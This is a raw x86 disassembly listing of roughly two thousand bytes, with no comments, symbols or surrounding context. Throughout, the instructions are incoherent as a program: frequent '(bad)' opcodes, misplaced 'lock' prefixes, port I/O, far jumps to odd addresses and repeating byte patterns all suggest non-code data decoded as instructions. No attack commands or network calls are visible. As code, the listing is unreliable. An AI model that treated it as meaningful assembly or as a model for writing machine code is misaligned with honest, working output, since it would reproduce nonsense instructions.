  4235e0:	mov    dl,0xba
  4235e2:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235e8:	xor    al,0x7a
  4235eb:	arpl   bp,di
  4235ed:	fst    DWORD PTR [edi]
  4235ef:	xor    BYTE PTR [edi+0x1e],0x80
  4235f3:	lock push ds
  4235f5:	push   ebx
  4235f6:	je     0x42364b
  4235f8:	push   ecx
  4235f9:	mov    dl,0x86
  4235fb:	or     al,0xb2
  4235fd:	mov    edx,0x50b2ff29
  423602:	ja     0x42367e
  423604:	xor    BYTE PTR [edi+0x3e],0x80
  423608:	lock ds push ebx
  42360b:	je     0x423660
  42360d:	push   ecx
  42360e:	mov    dl,0x86
  423610:	or     al,0xb2
  423612:	mov    edx,0x80b2ff29
  423617:	lock jp 0x423623
  42361a:	and    dh,BYTE PTR [edx-0x7f8588b0]
  423620:	ja     0x423668
  423622:	xor    al,0x46
  423625:	push   ebx
  423626:	je     0x42367b
  423628:	push   ecx
  423629:	mov    dl,0xba
  42362b:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423631:	xor    al,0x7a
  423634:	arpl   bp,di
  423636:	or     DWORD PTR [edi],ecx
  423638:	(bad)  
  423639:	or     al,0x8d
  42363b:	lea    eax,[eax+0x77507a77]
  423641:	scas   eax,DWORD PTR es:[edi]
  423642:	xor    BYTE PTR [edi+0x56],0xec
  423646:	ja     0x4236aa
  423648:	push   eax
  423649:	out    0x7a,eax
  42364b:	push   eax
  42364c:	ja     0x4236b8
  42364e:	pop    esi
  42364f:	cmc    
  423650:	and    al,0x6f
  423652:	cmp    BYTE PTR [eax+0x77],dl
  423655:	pop    esi
  423656:	jl     0x4236cf
  423658:	push   ss
  423659:	hlt    
  42365a:	and    al,0x6f
  42365c:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423660:	repz and al,0x6f
  423663:	cmp    BYTE PTR [eax+0x77],dl
  423666:	test   DWORD PTR [eax-0xf7f8589],0x5374537a
  423670:	push   ecx
  423671:	mov    dl,0x86
  423673:	or     al,0xb2
  423675:	mov    edx,0x50b2ff29
  42367a:	ja     0x423679
  42367c:	sub    BYTE PTR [edx-0x42],0x4f
  423680:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423686:	dec    edi
  423687:	or     cl,BYTE PTR [ebp+0x4d]
  42368a:	dec    ebp
  42368b:	jmp    0x7c6a:0x80386f24
  423692:	dec    edi
  423693:	xchg   ebp,eax
  423694:	dec    ebp
  423695:	dec    ebp
  423696:	dec    ebp
  423697:	or     esp,DWORD PTR [edi+ebp*2]
  42369a:	cmp    BYTE PTR [eax-0x7f957f96],al
  4236a0:	ja     0x423699
  4236a2:	xor    al,0xf7
  4236a5:	push   ebx
  4236a6:	je     0x4236fb
  4236a8:	push   ecx
  4236a9:	mov    dl,0x86
  4236ab:	or     al,0xb2
  4236ad:	mov    edx,0x80b2ff29
  4236b2:	lock std 
  4236b4:	or     DWORD PTR [edx],esp
  4236b6:	mov    dl,0x80
  4236b8:	lock push 0xffffff8f
  4236bb:	out    dx,al
  4236bc:	out    dx,eax
  4236bd:	adc    BYTE PTR [edi+0x4],dh
  4236c0:	sub    BYTE PTR [edx-0x80],0x77
  4236c4:	test   DWORD PTR [eax+0x5153f7f0],0xbab27453
  4236ce:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4236d4:	xor    al,0xfd
  4236d7:	or     DWORD PTR [edx],esp
  4236d9:	mov    dl,0x80
  4236db:	lock push ss
  4236dd:	adc    BYTE PTR [edi+0x53115316],0x7e
  4236e4:	mov    dl,0xbe
  4236e6:	or     al,0xb2
  4236e8:	clc    
  4236e9:	sub    edi,edi
  4236eb:	(bad)  
  4236ec:	in     al,dx
  4236ed:	mov    dl,0x80
  4236ef:	lock push 0x9
  4236f2:	loopne 0x423715
  4236f4:	out    dx,eax
  4236f5:	or     BYTE PTR [edi+0xa],0x4d
  4236f9:	dec    ebp
  4236fa:	dec    ebp
  4236fb:	sbb    BYTE PTR [eax],0xa
  4236fe:	dec    ebp
  4236ff:	dec    ebp
  423700:	dec    ebp
  423701:	push   ebx
  423702:	je     0x423757
  423704:	jle    0x4236b8
  423706:	xchg   BYTE PTR [edx+esi*4],cl
  423709:	clc    
  42370a:	sub    edi,edi
  42370c:	sti    
  42370d:	in     al,dx
  42370e:	mov    dl,0x9
  423710:	loopne 0x423702
  423712:	add    al,0x53
  423714:	std    
  423715:	adc    al,dh
  423717:	add    al,0x80
  423719:	push   0xffffff8f
  42371b:	ja     0x423721
  42371d:	xor    al,0xf7
  423720:	adc    BYTE PTR [edi+0x531153f7],0x7e
  423727:	mov    dl,0xf8
  423729:	sub    DWORD PTR [edx-0x100f342],esi
  42372f:	adc    BYTE PTR [edi-0x1ddf603],0x80
  423736:	xchg   edi,eax
  423737:	push   0x10
  423739:	out    dx,al
  42373a:	push   cs
  42373b:	sub    BYTE PTR [edx-0x80],0x77
  42373f:	test   DWORD PTR [eax+0x7453f7f0],0x86b25153
  423749:	or     al,0xb2
  42374b:	mov    edx,0x80b2ff29
  423750:	lock std 
  423752:	or     DWORD PTR [edx],esp
  423754:	mov    dl,0x80
  423756:	lock push 0xffffff8f
  423759:	out    dx,al
  42375a:	out    dx,eax
  42375b:	adc    BYTE PTR [edi+0x4],dh
  42375e:	sub    BYTE PTR [edx-0x80],0x77
  423762:	test   DWORD PTR [eax+0x7453f7f0],0x530c86b2
  42376c:	push   ecx
  42376d:	mov    dl,0xba
  42376f:	sub    edi,edi
  423771:	mov    dl,0x80
  423773:	lock std 
  423775:	or     DWORD PTR [edx],esp
  423777:	mov    dl,0x80
  423779:	lock pop esi
  42377b:	adc    BYTE PTR [edi+0x5311535e],0x7e
  423782:	mov    dl,0xbe
  423784:	or     al,0xb2
  423786:	clc    
  423787:	sub    edi,edi
  423789:	(bad)  
  42378a:	in     al,dx
  42378b:	mov    dl,0x80
  42378d:	lock push 0x9
  423790:	loopne 0x4237b3
  423792:	out    dx,eax
  423793:	or     BYTE PTR [edi-0x6b],0x4d
  423797:	dec    ebp
  423798:	dec    ebp
  423799:	sbb    BYTE PTR [eax],0x95
  42379c:	dec    ebp
  42379d:	dec    ebp
  42379e:	dec    ebp
  42379f:	push   ebx
  4237a0:	je     0x4237f5
  4237a2:	jle    0x423756
  4237a4:	xchg   BYTE PTR [edx+esi*4],cl
  4237a7:	clc    
  4237a8:	sub    edi,edi
  4237aa:	sti    
  4237ab:	in     al,dx
  4237ac:	mov    dl,0x9
  4237ae:	loopne 0x4237a0
  4237b0:	add    al,0x53
  4237b2:	std    
  4237b3:	adc    al,dh
  4237b5:	add    al,0x80
  4237b7:	push   0xffffff8f
  4237b9:	ja     0x4237bf
  4237bb:	xor    al,0xf7
  4237be:	adc    BYTE PTR [edi+0x531153f7],0x7e
  4237c5:	mov    dl,0xf8
  4237c7:	sub    DWORD PTR [edx-0x100f342],esi
  4237cd:	adc    BYTE PTR [edi-0x1ddf603],0x80
  4237d4:	xchg   edi,eax
  4237d5:	push   0x10
  4237d7:	out    dx,al
  4237d8:	push   cs
  4237d9:	sub    BYTE PTR [edx-0x80],0x77
  4237dd:	ss xor al,0x36
  4237e1:	push   ebx
  4237e2:	push   ecx
  4237e3:	push   ebx
  4237e4:	je     0x423798
  4237e6:	mov    edx,0xc86b229
  4237eb:	push   DWORD PTR [edx-0x7fa10f80]
  4237f1:	xchg   edi,eax
  4237f2:	pop    esi
  4237f3:	push   ebx
  4237f4:	adc    DWORD PTR [ebx+0x7e],edx
  4237f7:	mov    dl,0xbe
  4237f9:	or     al,0xb2
  4237fb:	clc    
  4237fc:	sub    edi,edi
  4237fe:	dec    BYTE PTR [ecx]
  423800:	and    dh,BYTE PTR [edx+0x50fd77ec]
  423806:	ja     0x423805
  423808:	xor    BYTE PTR [edi-0x3],0x80
  42380c:	lock scas eax,DWORD PTR es:[edi]
  42380e:	arpl   bp,di
  423810:	or     edx,ebp
  423812:	(bad)  
  423813:	or     eax,0x77804d4d
  423818:	pop    esi
  423819:	xor    al,0x5e
  42381c:	push   ebx
  42381d:	push   ecx
  42381e:	mov    dl,0xba
  423820:	sub    DWORD PTR [ebx+0x74],edx
  423823:	mov    dl,0x86
  423825:	or     al,0xff
  423827:	mov    dl,0x80
  423829:	lock scas eax,DWORD PTR es:[edi]
  42382b:	or     DWORD PTR [edx],esp
  42382d:	mov    dl,0x80
  42382f:	lock jp 0x423885
  423832:	adc    DWORD PTR [edx-0x4d00f342],esi
  423838:	xor    al,0x7a
  42383b:	push   ebx
  42383c:	push   ecx
  42383d:	mov    dl,0xba
  42383f:	sub    edi,edi
  423841:	mov    dl,0x50
  423843:	ja     0x42387b
  423845:	xor    BYTE PTR [edi-0x7e],0x80
  423849:	lock adc BYTE PTR [ebx+0x51],0xb2
  42384e:	mov    edx,0xb2745329
  423853:	xchg   BYTE PTR [edi+edi*8],cl
  423856:	mov    dl,0x80
  423858:	lock add BYTE PTR [eax+0x11538297],0xb2
  423860:	mov    esi,0xb27e530c
  423865:	clc    
  423866:	sub    edi,edi
  423868:	(bad)  
  423869:	in     al,dx
  42386a:	lock ss in al,dx
  42386d:	std    
  42386e:	in     al,dx
  42386f:	lock push esi
  423871:	push   eax
  423872:	lock push esi
  423874:	les    ebx,FWORD PTR ds:0x80827780
  42387a:	lock adc BYTE PTR [ebx+0x74],0x53
  42387f:	push   ecx
  423880:	mov    dl,0x86
  423882:	or     al,0xb2
  423884:	mov    edx,0xecb2ff29
  423889:	ja     0x4238e1
  42388b:	push   eax
  42388c:	ja     0x4238e4
  42388e:	xor    BYTE PTR [edi-0x7e],0x80
  423892:	lock adc BYTE PTR [ebx+0x74],0xb2
  423897:	xchg   BYTE PTR [ebx+edx*2],cl
  42389a:	push   ecx
  42389b:	mov    dl,0xba
  42389d:	sub    edi,edi
  42389f:	mov    dl,0x80
  4238a1:	lock test BYTE PTR [ebx-0x3],al
  4238a5:	xor    BYTE PTR [edi-0x7e],0x80
  4238a9:	xchg   edi,eax
  4238aa:	adc    BYTE PTR [ebx+0x74],0x53
  4238ae:	jle    0x423862
  4238b0:	clc    
  4238b1:	sub    DWORD PTR [edx-0x400f37a],esi
  4238b7:	adc    BYTE PTR [edi-0x4ddf6aa],0x63
  4238be:	mov    dl,0x9
  4238c0:	dec    esp
  4238c1:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4238c7:	mov    eax,DWORD PTR [eax+0x77808b77]
  4238cd:	mov    dl,BYTE PTR [eax+0x77]
  4238d0:	xor    BYTE PTR ss:[edi-0x11],0x80
  4238d5:	lock adc BYTE PTR es:[edi-0x4deeacda],0xbe
  4238de:	or     al,0x53
  4238e0:	jle    0x423862
  4238e2:	int    0x32
  4238e4:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  4238ea:	(bad)  
  4238eb:	(bad)  
  4238ec:	xchg   esi,eax
  4238ed:	xor    al,0x66
  4238f0:	adc    BYTE PTR [edi+0x53115366],0x7e
  4238f7:	mov    dl,0xbe
  4238f9:	or     al,0xb2
  4238fb:	clc    
  4238fc:	sub    edi,edi
  4238fe:	(bad)  
  4238ff:	xchg   esi,eax
  423900:	xor    al,0x8b
  423903:	adc    BYTE PTR [edi+0x36d74d8b],0x53
  42390a:	adc    DWORD PTR [ebx+0x7e],edx
  42390d:	mov    dl,0xbe
  42390f:	or     al,0xb2
  423911:	clc    
  423912:	sub    edi,edi
  423914:	(bad)  
  423915:	xchg   esi,eax
  423916:	dec    ebp
  423917:	or     dl,BYTE PTR ds:0x808bf080
  42391d:	xchg   edi,eax
  42391e:	mov    edx,DWORD PTR [ebx+0x11]
  423921:	push   ebx
  423922:	jle    0x4238d6
  423924:	mov    esi,0x29f8b20c
  423929:	(bad)  
  42392a:	(bad)  
  42392b:	push   eax
  42392c:	ja     0x423994
  42392e:	arpl   bp,di
  423930:	or     DWORD PTR [edi],ecx
  423932:	cmp    al,0x8d
  423934:	lea    ecx,[ebp-0x3b748880]
  42393a:	lock adc BYTE PTR [edi-0x7b88af9a],0x6e
  423942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423943:	test   BYTE PTR [eax-0x414d7b10],al
  423949:	or     al,0x53
  42394b:	cld    
  42394c:	mov    dl,0x84
  42394e:	sub    edi,edi
  423950:	mov    dl,0x80
  423952:	lock jbe 0x4238e4
  423955:	and    DWORD PTR [edx],edi
  423957:	adc    BYTE PTR [ecx],ah
  423959:	jno    0x4238db
  42395b:	lock stc 
  42395d:	xor    al,0xf9
  423960:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423967:	mov    dl,0xf8
  423969:	sub    DWORD PTR [edx-0x100f342],esi
  42396f:	adc    BYTE PTR [edi-0x7f021307],0x77
  423976:	test   BYTE PTR [ebx-0x6c],dl
  423979:	in     eax,dx
  42397a:	test   BYTE PTR [edx-0x4d750713],cl
  423980:	mov    esi,0xfffbec29
  423985:	mov    dl,0x53
  423987:	jl     0x423909
  423989:	lock mov al,BYTE PTR [eax-0x74d7569]
  423990:	or     al,0xb2
  423992:	mov    esi,0x53b6ff29
  423997:	pushf  
  423998:	arpl   bx,di
  42399a:	xlat   BYTE PTR ds:[ebx]
  42399b:	sub    al,0x80
  42399d:	ja     0x42398e
  42399f:	xor    al,0x2e
  4239a2:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  4239a9:	lea    ecx,[ebp+0x7e531153]
  4239af:	mov    dl,0xbe
  4239b1:	or     al,0xb2
  4239b3:	clc    
  4239b4:	sub    edi,edi
  4239b6:	(bad)  
  4239b7:	xchg   esi,eax
  4239b8:	xor    al,0x8b
  4239bb:	adc    BYTE PTR [edi+0x5311538b],0x7e
  4239c2:	mov    dl,0xbe
  4239c4:	or     al,0xb2
  4239c6:	clc    
  4239c7:	sub    edi,edi
  4239c9:	(bad)  
  4239ca:	xchg   esi,eax
  4239cb:	dec    ebp
  4239cc:	xlat   BYTE PTR ds:[ebx]
  4239cd:	jbe    0x423a1c
  4239cf:	or     bl,BYTE PTR ds:0x50667780
  4239d5:	ja     0x423a4d
  4239d7:	xor    BYTE PTR [edi+0x36],0x50
  4239db:	ja     0x423967
  4239dd:	xor    BYTE PTR [edi-0x76],0x53
  4239e1:	jo     0x4239d0
  4239e3:	xchg   dh,ch
  4239e5:	aad    0x43
  4239e7:	xor    BYTE PTR [edi+0x76],0x80
  4239eb:	adc    eax,0x767780ef
  4239f0:	sub    dh,0xef
  4239f3:	push   ebx
  4239f4:	cld    
  4239f5:	push   ebx
  4239f6:	xchg   esp,eax
  4239f7:	mov    dl,0x84
  4239f9:	sub    DWORD PTR [edx-0x400f3f9],esi
  4239ff:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423a06:	ja     0x423992
  423a08:	in     eax,dx
  423a09:	mov    dl,0xee
  423a0b:	in     eax,dx
  423a0c:	xchg   dh,ch
  423a0e:	arpl   bp,di
  423a10:	in     al,0x98
  423a12:	xor    BYTE PTR [edi-0x76],0x53
  423a16:	jo     0x423a05
  423a18:	xchg   dh,ch
  423a1a:	aad    0x43
  423a1c:	xor    BYTE PTR [edi+0x76],0x80
  423a20:	adc    eax,0x767780ef
  423a25:	sub    dh,0xef
  423a28:	push   ebx
  423a29:	cld    
  423a2a:	push   ebx
  423a2b:	xchg   esp,eax
  423a2c:	mov    dl,0x84
  423a2e:	sub    DWORD PTR [edx-0x400f3f9],esi
  423a34:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423a3b:	ja     0x4239c7
  423a3d:	in     eax,dx
  423a3e:	mov    dl,0xee
  423a40:	in     eax,dx
  423a41:	xchg   dh,ch
  423a43:	arpl   bp,di
  423a45:	in     al,0x98
  423a47:	xor    BYTE PTR [edi+0x76],0x80
  423a4b:	lock stc 
  423a4d:	push   eax
  423a4e:	ja     0x4239ff
  423a50:	xor    BYTE PTR [edi-0x7],0x53
  423a54:	adc    DWORD PTR [ebx-0x4],edx
  423a57:	mov    dl,0x84
  423a59:	sub    DWORD PTR [edx-0x200f342],esi
  423a5f:	xor    BYTE PTR [edi-0x75],0x50
  423a63:	lock es jl 0x423ade
  423a67:	inc    ecx
  423a68:	ins    DWORD PTR es:[edi],dx
  423a69:	pop    ebp
  423a6a:	ins    DWORD PTR es:[edi],dx
  423a6b:	aas    
  423a6c:	jl     0x423ae5
  423a6e:	pop    edx
  423a6f:	ins    DWORD PTR es:[edi],dx
  423a70:	inc    ebx
  423a71:	ins    DWORD PTR es:[edi],dx
  423a72:	push   ebx
  423a73:	push   eax
  423a74:	ja     0x423adc
  423a76:	fsub   QWORD PTR [si]
  423a79:	outs   dx,DWORD PTR ds:[esi]
  423a7a:	cmp    BYTE PTR [ecx],cl
  423a7c:	jg     0x80cfc80f
  423a82:	xchg   edi,eax
  423a83:	scas   eax,DWORD PTR es:[edi]
  423a84:	cmp    ch,0x53
  423a87:	adc    DWORD PTR [eax-0x10],edx
  423a8a:	test   BYTE PTR [edx+0x530c84c7],dh
  423a90:	cld    
  423a91:	mov    dl,0x84
  423a93:	sub    edi,edi
  423a95:	ja     0x423a1b
  423a97:	push   eax
  423a98:	lock bound ecx,QWORD PTR [edi+0x9412f31]
  423a9f:	cli    
  423aa0:	out    dx,al
  423aa1:	jno    0x423a70
  423aa3:	add    eax,0xbdbecdcd
  423aa8:	or     eax,esp
  423aaa:	jo     0x423b0f
  423aac:	mov    dl,0xd7
  423aae:	fiadd  DWORD PTR [eax-0xf7f0689]
  423ab4:	stc    
  423ab5:	xor    BYTE PTR [edi-0x7],0x80
  423ab9:	xchg   edi,eax
  423aba:	stc    
  423abb:	push   ebx
  423abc:	cld    
  423abd:	push   ebx
  423abe:	adc    DWORD PTR [edx-0x414dd67c],esi
  423ac4:	or     al,0xff
  423ac6:	std    
  423ac7:	xor    BYTE PTR [edi+0x66],0x53
  423acb:	cld    
  423acc:	mov    dl,0x84
  423ace:	sub    edi,edi
  423ad0:	ja     0x423a56
  423ad2:	push   ebx
  423ad3:	xchg   esp,eax
  423ad4:	in     al,dx
  423ad5:	std    
  423ad6:	xor    BYTE PTR [edi+0x62],0xed
  423ada:	test   BYTE PTR [edx-0x4d750713],cl
  423ae0:	mov    esi,0xfff7ec29
  423ae5:	(bad)  
  423ae6:	push   ebx
  423ae7:	sub    al,BYTE PTR [eax+0x66f050b2]
  423aed:	fsub   QWORD PTR [si]
  423af0:	outs   dx,DWORD PTR ds:[esi]
  423af1:	cmp    bh,dl
  423af3:	add    DWORD PTR [eax-0x6f3bd910],eax
  423af9:	xor    al,0x8b
  423afc:	xor    BYTE PTR [edi-0x75],0x53
  423b00:	adc    DWORD PTR [ebx-0x4],edx
  423b03:	mov    dl,0xbe
  423b05:	or     al,0xb2
  423b07:	test   BYTE PTR [ecx],ch
  423b09:	(bad)  
  423b0a:	std    
  423b0b:	xor    BYTE PTR [edi-0x75],0x80
  423b0f:	xchg   edi,eax
  423b10:	mov    edx,DWORD PTR [ebx+0x74]
  423b13:	push   ebx
  423b14:	jle    0x423ac8
  423b16:	xchg   BYTE PTR [edx+esi*4],cl
  423b19:	clc    
  423b1a:	sub    edi,edi
  423b1c:	sti    
  423b1d:	arpl   WORD PTR [edx+0xc230f09],si
  423b23:	lea    ecx,[ebp-0x7f508880]
  423b29:	ins    DWORD PTR es:[edi],dx
  423b2a:	out    dx,eax
  423b2b:	push   eax
  423b2c:	out    0xf9,eax
  423b2e:	jl     0x423ba7
  423b30:	es repz and al,0x6f
  423b34:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423b38:	hlt    
  423b39:	and    al,0x6f
  423b3b:	cmp    BYTE PTR [edi+esi*2+0x7a],bh
  423b3f:	mul    BYTE PTR [ebx+0x777c386f]
  423b45:	test   dl,bh
  423b47:	and    al,0x6f
  423b49:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423b4d:	nop
  423b4e:	shr    BYTE PTR [edi+0x38],1
  423b51:	push   eax
  423b52:	ja     0x423b92
  423b54:	xor    BYTE PTR [edi-0x11],0x80
  423b58:	lock test BYTE PTR [eax+0x11538497],al
  423b5f:	mov    dl,0xbe
  423b61:	or     al,0x53
  423b63:	jle    0x423b17
  423b65:	clc    
  423b66:	sub    edi,edi
  423b68:	(bad)  
  423b69:	xchg   esi,eax
  423b6a:	xor    al,0x7a
  423b6d:	adc    BYTE PTR [edi-0x4deeac86],0xbe
  423b74:	or     al,0x53
  423b76:	jle    0x423af8
  423b78:	int    0x32
  423b7a:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b80:	(bad)  
  423b81:	(bad)  
  423b82:	xchg   esi,eax
  423b83:	xor    al,0x66
  423b86:	adc    BYTE PTR [edi+0x53115366],0x7e
  423b8d:	mov    dl,0xbe
  423b8f:	or     al,0xb2
  423b91:	clc    
  423b92:	sub    edi,edi
  423b94:	(bad)  
  423b95:	xchg   esi,eax
  423b96:	xor    al,0xf9
  423b99:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423ba0:	mov    dl,0xbe
  423ba2:	or     al,0xb2
  423ba4:	clc    
  423ba5:	sub    edi,edi
  423ba7:	(bad)  
  423ba8:	xchg   esi,eax
  423ba9:	dec    ebp
  423baa:	or     dl,BYTE PTR ds:0x80667750
  423bb0:	ja     0x423ba1
  423bb2:	xor    al,0x84
  423bb5:	adc    BYTE PTR [edi-0x4deeac7c],0xbe
  423bbc:	or     al,0x53
  423bbe:	jle    0x423b40
  423bc0:	int    0x32
  423bc2:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423bc8:	(bad)  
  423bc9:	(bad)  
  423bca:	xchg   esi,eax
  423bcb:	xor    al,0x7a
  423bce:	adc    BYTE PTR [edi+0x5311537a],0x7e
  423bd5:	mov    dl,0xbe
  423bd7:	or     al,0xb2
  423bd9:	clc    
  423bda:	sub    edi,edi
  423bdc:	(bad)  
  423bdd:	xchg   esi,eax
  423bde:	xor    al,0xf9
  423be1:	adc    BYTE PTR [edi+0x3ed74df9],0x53
  423be8:	adc    DWORD PTR [ebx+0x7e],edx
  423beb:	mov    dl,0xbe
  423bed:	or     al,0xb2
  423bef:	clc    
  423bf0:	sub    edi,edi
  423bf2:	(bad)  
  423bf3:	xchg   esi,eax
  423bf4:	dec    ebp
  423bf5:	or     dl,BYTE PTR ds:0x50f9f080
  423bfb:	ja     0x423b81
  423bfd:	xor    BYTE PTR [edi-0x7],0x53
  423c01:	adc    DWORD PTR [ebx-0x4],edx
  423c04:	mov    dl,0xbe
  423c06:	or     al,0xb2
  423c08:	test   BYTE PTR [ecx],ch
  423c0a:	(bad)  
  423c0b:	std    
  423c0c:	xor    BYTE PTR [edi+0x66],0x63
  423c10:	std    
  423c11:	or     DWORD PTR [edi],ecx
  423c13:	cmp    eax,0x808d8d2f
  423c18:	lock stc 
  423c1a:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c21:	mov    dl,0xbe
  423c23:	or     al,0xb2
  423c25:	clc    
  423c26:	sub    edi,edi
  423c28:	(bad)  
  423c29:	arpl   ax,si
  423c2b:	test   BYTE PTR [ecx],cl
  423c2d:	bswap  edi
  423c2f:	das    
  423c30:	lea    ecx,[ebp-0x7fd90f80]
  423c36:	lock es mov dl,0xbe
  423c3a:	or     al,0xcd
  423c3c:	add    eax,0x80ef10c4
  423c41:	lock stc 
  423c43:	xor    al,0xf9
  423c46:	mov    dl,0xbe
  423c48:	or     al,0xcd
  423c4a:	add    eax,0x3a7d10c4
  423c4f:	xor    al,0x36
  423c52:	xor    al,0x36
  423c55:	mov    dl,0xbe
  423c57:	or     al,0xcd
  423c59:	add    eax,0xc7d10c4
  423c5e:	in     eax,dx
  423c5f:	cmp    BYTE PTR ds:0x8d4d4d4d,bl
  423c65:	in     eax,dx
  423c66:	cmp    BYTE PTR ds:0x8d4d4d4d,ah
  423c6c:	add    DWORD PTR [ecx],eax
  423c6e:	and    eax,0x964d4d4d
  423c73:	dec    ebp
  423c74:	xlat   BYTE PTR ds:[ebx]
  423c75:	add    DWORD PTR ds:[ecx],eax
  423c78:	sbb    eax,0x4d4d4d4d
  423c7d:	xlat   BYTE PTR ds:[ebx]
  423c7e:	test   BYTE PTR [esi+0x4daff080],dl
  423c84:	sahf   
  423c85:	and    DWORD PTR [eax-0x4d128910],eax
  423c8b:	jno    0x423c23
  423c8d:	or     al,BYTE PTR [esi+0x4d4d8832]
  423c93:	push   eax
  423c94:	ja     0x423cf8
  423c96:	xor    BYTE PTR [edi-0x11],0x80
  423c9a:	lock adc BYTE PTR cs:[edi+0x32cd802e],0x3a
  423ca3:	lea    ecx,[ebp+0x7e531153]
  423ca9:	mov    dl,0xbe
  423cab:	or     al,0xb2
  423cad:	clc    
  423cae:	sub    edi,edi
  423cb0:	(bad)  
  423cb1:	xchg   esi,eax
  423cb2:	xor    al,0xf9
  423cb5:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423cbc:	mov    dl,0xbe
  423cbe:	or     al,0xb2
  423cc0:	clc    
  423cc1:	sub    edi,edi
  423cc3:	(bad)  
  423cc4:	xchg   esi,eax
  423cc5:	dec    ebp
  423cc6:	xlat   BYTE PTR ds:[ebx]
  423cc7:	dec    bp
  423cc9:	or     bl,BYTE PTR ds:0xb2627780
  423ccf:	push   0xc
  423cd1:	push   ebx
  423cd2:	jl     0x423d37
  423cd4:	jl     0x423c56
  423cd6:	ja     0x423cc7
  423cd8:	xor    al,0x2e
  423cdb:	or     ch,0x32
  423cde:	cmp    cl,BYTE PTR [ebp+0x2e97808d]
  423ce4:	xlat   BYTE PTR ds:[ebx]
  423ce5:	push   ebp
  423ce6:	push   ebx
  423ce7:	adc    DWORD PTR [ebx+0x7e],edx
  423cea:	mov    dl,0xbe
  423cec:	or     al,0xb2
  423cee:	clc    
  423cef:	sub    edi,edi
  423cf1:	(bad)  
  423cf2:	xchg   esi,eax
  423cf3:	xor    al,0xf9
  423cf6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423cfd:	mov    dl,0xbe
  423cff:	or     al,0xb2
  423d01:	clc    
  423d02:	sub    edi,edi
  423d04:	(bad)  
  423d05:	xchg   esi,eax
  423d06:	dec    ebp
  423d07:	xlat   BYTE PTR ds:[ebx]
  423d08:	jbe    0x423d57
  423d0a:	or     bl,BYTE PTR ds:0x50847780
  423d10:	ja     0x423d88
  423d12:	xor    BYTE PTR [edi+0x3e],0x50
  423d16:	ja     0x423ca2
  423d18:	les    edi,FWORD PTR [ecx]
  423d1a:	push   ebx
  423d1b:	adc    DWORD PTR [ebx+0x7e],edx
  423d1e:	mov    dl,0xbe
  423d20:	or     al,0xb2
  423d22:	clc    
  423d23:	sub    edi,edi
  423d25:	(bad)  
  423d26:	xchg   esi,eax
  423d27:	xor    al,0xf9
  423d2a:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423d31:	mov    dl,0xbe
  423d33:	or     al,0xb2
  423d35:	clc    
  423d36:	sub    edi,edi
  423d38:	(bad)  
  423d39:	xchg   esi,eax
  423d3a:	dec    ebp
  423d3b:	xlat   BYTE PTR ds:[ebx]
  423d3c:	test   BYTE PTR [ebp+0xa],cl
  423d3f:	sbb    eax,0x508a7780
  423d44:	ja     0x423d64
  423d46:	xor    BYTE PTR [edi+0x76],0x50
  423d4a:	out    0x56,eax
  423d4c:	push   eax
  423d4d:	ja     0x423db1
  423d4f:	jl     0x423dc8
  423d51:	xor    ch,0x24
  423d54:	outs   dx,DWORD PTR ds:[esi]
  423d55:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d5b:	push   esi
  423d5c:	push   ebx
  423d5d:	cld    
  423d5e:	push   ebx
  423d5f:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d65:	or     al,0xff
  423d67:	mov    dl,0x50
  423d69:	ja     0x423db1
  423d6b:	xor    BYTE PTR [edi+0x56],0x80
  423d6f:	lock push esi
  423d71:	push   ebx
  423d72:	cld    
  423d73:	push   ebx
  423d74:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d7a:	or     al,0xff
  423d7c:	mov    dl,0x50
  423d7e:	ja     0x423d2f
  423d80:	jl     0x423df9
  423d82:	jp     0x423dcd
  423d84:	and    al,0x6f
  423d86:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  423d8a:	fisub  WORD PTR [edi+ebp*2]
  423d8d:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d93:	push   esi
  423d94:	push   ebx
  423d95:	cld    
  423d96:	push   ebx
  423d97:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d9d:	sub    edi,edi
  423d9f:	mov    dl,0x80
  423da1:	lock push ds
  423da3:	arpl   bp,di
  423da5:	or     DWORD PTR [edi],ecx
  423da7:	pop    ss
  423da8:	in     al,dx
  423da9:	lea    ecx,[ebp-0x72f35f42]
  423daf:	lea    eax,[eax+0x77807af0]
  423db5:	jp     0x423d37
  423db7:	xchg   edi,eax
  423db8:	inc    esi
  423db9:	push   ebx
  423dba:	je     0x423e0f
  423dbc:	push   ecx
  423dbd:	mov    dl,0x86
  423dbf:	or     al,0xb2
  423dc1:	mov    edx,0x80fdff29
  423dc6:	ja     0x423de6
  423dc8:	inc    ebx
  423dc9:	sti    
  423dca:	push   ebx
  423dcb:	jb     0x423e18
  423dcd:	add    eax,0x80af7750
  423dd2:	ja     0x423d58
  423dd4:	xor    al,0x84
  423dd7:	push   ebx
  423dd8:	cld    
  423dd9:	push   ebx
  423dda:	adc    DWORD PTR [edx-0x7b4df342],esi
  423de0:	sub    edi,edi
  423de2:	mov    dl,0x80
  423de4:	lock scas eax,DWORD PTR es:[edi]
  423de6:	arpl   bp,di
  423de8:	fst    DWORD PTR [edi]
  423dea:	xor    BYTE PTR [edi-0x7c],0x80
  423dee:	lock test BYTE PTR [ebx-0x4],dl
  423df2:	push   ebx
  423df3:	adc    DWORD PTR [edx-0x414dd67c],esi
  423df9:	or     al,0xff
